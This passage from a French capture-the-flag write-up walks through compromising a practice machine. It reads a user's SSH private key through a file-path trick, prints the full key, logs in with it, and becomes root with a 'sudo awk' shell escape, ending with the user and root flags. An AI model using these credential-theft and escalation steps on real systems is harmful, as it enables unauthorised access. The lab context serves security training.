+<span class="token builtin class-name">cd</span> /opt
+<span class="token function">ls</span> -la
+<span class="token builtin class-name">cd</span> pendekar/
+<span class="token comment"># [plein de lignes]</span>
+<span class="token builtin class-name">echo</span> <span class="token string">'/home/pendekar/.ssh/id_rsa'</span> <span class="token operator">></span> official_letter.txt
+<span class="token function">cat</span> official_letter.txt</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
+<p>On essaie de reproduire cette commmande.</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token builtin class-name">cd</span> /opt/pendekar/
+$ <span class="token builtin class-name">echo</span> <span class="token string">'/home/pendekar/.ssh/id_rsa'</span> <span class="token operator">></span> official_letter.txt
+<span class="token operator">&lt;</span> <span class="token string">'/home/pendekar/.ssh/id_rsa'</span> <span class="token operator">></span> official_letter.txt
+$ <span class="token function">cat</span> official_letter.txt
+/home/pendekar/.ssh/id_rsa</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
+<p>Et si on retourne dans le seul fichier que l'on a pu ouvrir.</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> /home/pendekar/send_letter.txt
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
+<p>On obtient la clef de l'utilisateur "pendekar" que l'on stocke dans un fichier nommé "pem" sur la machine attaquante.</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'contenu de la clef'</span> <span class="token operator">></span> pem
+$ <span class="token function">chmod</span> <span class="token number">666</span>
+$ <span class="token function">ssh</span> -i pem pendekar@<span class="token variable">$IP</span>
+$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>pendekar<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>pendekar<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>pendekar<span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
+<p>On trouve le flag user dans le répertoire de l'utilisateur ("/home/pendekar").</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> user.txt
+1970fa17c52fdf2ff1d5da9af96733b2</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
+<p>Puis un fichier d'instruction dans le répertoire de l'autre utilisateur "hangtuah".</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token builtin class-name">cd</span> /home/hangtuah
+$ <span class="token function">cat</span> lastnotes.txt
+I have been waiting <span class="token keyword">for</span> you pendekar<span class="token punctuation">..</span> I <span class="token keyword">do</span> not have enough time.
+Many people looking <span class="token keyword">for</span> me there is no <span class="token function">more</span> hope <span class="token keyword">for</span> <span class="token for-or-select variable">me</span> <span class="token keyword">in</span> here.
+I know you are the best one to secure this palace instead of me.
+I need to go now somewhere very far and I hope we will meet soon<span class="token punctuation">..</span>.
+
+<span class="token punctuation">..</span>
+--. <span class="token punctuation">..</span> <span class="token punctuation">..</span>.- <span class="token builtin class-name">.</span>
+-.-- --- <span class="token punctuation">..</span>-
+.--. <span class="token builtin class-name">.</span> .-. -- <span class="token punctuation">..</span> <span class="token punctuation">..</span>. <span class="token punctuation">..</span>. <span class="token punctuation">..</span> --- -.
+.- .-<span class="token punctuation">..</span> .-. <span class="token builtin class-name">.</span> .- -<span class="token punctuation">..</span> -.-- .-.-.- .-.-.- .-.-.-
+- <span class="token punctuation">..</span><span class="token punctuation">..</span> <span class="token builtin class-name">.</span>
+.-<span class="token punctuation">..</span>-. -.- <span class="token builtin class-name">.</span> -.-- .-<span class="token punctuation">..</span>-. .-.-.- .-.-.- .-.-.-
+-.-- --- <span class="token punctuation">..</span>-
+-.- -. --- .--
+.-- <span class="token punctuation">..</span><span class="token punctuation">..</span> .- -
+<span class="token punctuation">..</span>
+-- <span class="token builtin class-name">.</span> .- -.
+-<span class="token punctuation">..</span>. <span class="token builtin class-name">.</span> -.-. .- <span class="token punctuation">..</span>- <span class="token punctuation">..</span>. <span class="token builtin class-name">.</span>
+-.-- --- <span class="token punctuation">..</span>-
+.- .-. <span class="token builtin class-name">.</span>
+.--. <span class="token builtin class-name">.</span> -. -<span class="token punctuation">..</span> <span class="token builtin class-name">.</span> -.- .- .-. -.-.--
+
+-<span class="token punctuation">..</span><span class="token punctuation">..</span>-
+<span class="token punctuation">..</span><span class="token punctuation">..</span> .- -. --. - <span class="token punctuation">..</span>- .- <span class="token punctuation">..</span><span class="token punctuation">..</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
+<p>La seconde partie ressemble à du langage morse. Sur le site <a href="https://www.dcode.fr/code-morse" target="_blank" rel="nofollow noopener noreferrer">https://www.dcode.fr</a> avec l'option cochée "Prendre pour court et long ces deux caractères", on trouve <code class="language-text">IGIVEYOUPERMISSIONALREADY...THE&quot;KEY&quot;...YOUKNOWWHATIMEANBECAUSEYOUAREPENDEKAR!-HANGTUAH</code>.</p>
+<p>Apparement, la clef existante fonctionnerait avec l'autre compte, celui de "hangtuah". On se déconnecte de la session <strong>SSH</strong>.</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token builtin class-name">exit</span>
+<span class="token builtin class-name">logout</span>
+Connection to <span class="token number">192.168</span>.1.28 closed.</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
+<p>Pour se connecter avec le nouveau compte.</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">ssh</span> -i pem hangtuah@<span class="token variable">$IP</span>
+$ <span class="token function">whoami</span>
+hangtuah</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
+<h2>Escalation</h2>
+<p>Regardons les privilèges de cet utilisateur.</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">sudo</span> -l
+User hangtuah may run the following commands on legacyhangtuah:
+    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/awk</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
+<p>Sur <a href="https://gtfobins.github.io/gtfobins/awk/#sudo" target="_blank" rel="nofollow noopener noreferrer">GTOBins</a>, on trouve la commande <code class="language-text">awk</code> pour devenir root.</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">awk</span> <span class="token string">'BEGIN {system("/bin/sh")}'</span>
+$ <span class="token function">whoami</span>
+root</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
+<p>Désormais utilisateur "root", on trouve facilement le flag root.</p>
+<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> /root/root.txt
+8840d1ea10bfc55b0e2dd2354524d779</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
+<h2>Sources</h2>
+<ul>
+<li>Le protocole WebDAV <a href="https://fr.wikipedia.org/wiki/WebDAV" target="_blank" rel="nofollow noopener noreferrer">https://fr.wikipedia.org/wiki/WebDAV</a> ;</li>
+<li>Comment exploiter WebDAV <a href="https://null-byte.wonderhowto.com/how-to/exploit-webdav-server-get-shell-0204718" target="_blank" rel="nofollow noopener noreferrer">https://null-byte.wonderhowto.com/how-to/exploit-webdav-server-get-shell-0204718</a>.</li>
+</ul>
+</article></div></div></div></main><footer class="text-white mt-4"><ul class="nav nav-pills justify-content-center"><li><a href="https://github.com/etienner" target="_blank" rel="noopener" class="nav-link">Github</a></li><li><a href="https://medium.com/@etiennerouzeaud" target="_blank" rel="noopener" class="nav-link">Medium</a></li><li><a href="https://twitter.com/etiennerouzeaud" target="_blank" rel="noopener" class="nav-link">Twitter</a></li></ul></footer></div>
+    <script src="/assets/js/app.8f509c54.js" defer></script><script src="/assets/js/page--src-templates-post-vue.12e71a8f.js" defer></script>
+  </body>
+</html>
